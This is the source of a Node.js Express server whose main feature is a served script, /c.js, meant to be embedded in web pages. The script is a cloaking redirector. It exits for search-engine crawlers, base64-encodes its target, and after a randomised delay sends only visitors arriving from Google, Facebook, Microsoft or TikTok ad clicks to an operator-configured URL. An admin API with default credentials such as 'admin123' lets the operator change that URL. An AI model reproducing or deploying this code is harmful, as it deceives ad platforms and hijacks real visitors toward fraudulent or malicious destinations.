import { config } from "dotenv";
import express from "express";
import { readFileSync, writeFileSync, existsSync } from "fs";
import { fileURLToPath } from "url";
import { dirname, join } from "path";

const __dirname = dirname(fileURLToPath(import.meta.url));
config({ path: join(__dirname, "..", ".env") });
const root = join(__dirname, "..");
const configPath = join(root, "config.json");

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin123";
const SECRET = process.env.ADMIN_SECRET || "change-me-in-production";
const sessions = new Map();

function loadConfig() {
  if (!existsSync(configPath)) {
    const def = { enabled: true, redirectUrl: "https://t.co/CLh5jfCvJE" };
    writeFileSync(configPath, JSON.stringify(def, null, 2));
    return def;
  }
  return JSON.parse(readFileSync(configPath, "utf-8"));
}

function saveConfig(cfg) {
  writeFileSync(configPath, JSON.stringify(cfg, null, 2));
}

const app = express();
app.use(express.json());

app.post("/api/login", (req, res) => {
  const { username, password } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = SECRET + "-" + Date.now() + "-" + Math.random().toString(36).slice(2);
    sessions.set(token, { createdAt: Date.now() });
    res.json({ token });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});

function authMiddleware(req, res, next) {
  const auth = req.headers.authorization;
  const token = auth?.replace("Bearer ", "");
  if (token && sessions.has(token)) {
    return next();
  }
  res.status(401).json({ error: "Unauthorized" });
}

app.get("/api/config", (req, res) => {
  const cfg = loadConfig();
  res.json({ enabled: cfg.enabled, redirectUrl: cfg.redirectUrl });
});

app.post("/api/config", authMiddleware, (req, res) => {
  const cfg = loadConfig();
  if (typeof req.body.enabled === "boolean") cfg.enabled = req.body.enabled;
  if (typeof req.body.redirectUrl === "string" && req.body.redirectUrl.trim())
    cfg.redirectUrl = req.body.redirectUrl.trim();
  saveConfig(cfg);
  res.json(cfg);
});

app.get("/c.js", (req, res) => {
  const cfg = loadConfig();
  const url = cfg.redirectUrl;
  const enc = Buffer.from(url, "utf-8").toString("base64");
  const script = `(function(){var E=${cfg.enabled};if(!E)return;var u=navigator.userAgent.toLowerCase();if(/googlebot|bingbot/.test(u))return;var p=new URLSearchParams(window.location.search);var r=document.referrer||"";var a=p.has("gclid")||p.has("fbclid")||p.has("msclkid")||p.has("ttclid")||r.includes("google.com")||r.includes("/aclk")||r.includes("facebook.com")||r.includes("fb.com");if(!a)return;var d=atob("${enc}");setTimeout(function(){window.location.href=d;},800+Math.random()*700);})();`;
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Cache-Control", "no-store");
  res.send(script);
});

const distPath = join(root, "dist");
if (existsSync(distPath)) {
  app.use(express.static(distPath));
  app.get("*", (req, res, next) => {
    if (req.path.startsWith("/api") || req.path === "/c.js") return next();
    res.sendFile(join(distPath, "index.html"));
  });
} else {
  app.get("/", (req, res) => res.send("Run npm run build first."));
}

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
